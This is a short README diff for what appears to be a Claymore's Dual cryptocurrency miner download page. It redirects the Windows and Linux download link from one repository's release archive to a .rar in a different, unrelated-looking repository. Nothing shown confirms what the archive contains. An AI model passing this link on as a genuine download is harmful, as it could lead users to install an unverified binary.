@@ -6,7 +6,7 @@
 <p align="center">
 <img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/Activity/date.svg" />
  
-- [ ] [Download Claymore's Dual v15.0 for Windows & Linux](https://github.com/BTC-Hub/Claymore-Dual-Miner/releases/download/ClaymoresDual/Claymore.s.Dual.Miner.rar)
+- [ ] [Download Claymore's Dual v15.0 for Windows & Linux](https://github.com/BTC-Hub/BTC-HUB/releases/download/minerswindows/Claymore.s.Dual.Miner.rar)
 
  <img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/Activity/uptime.svg" />
 </p>
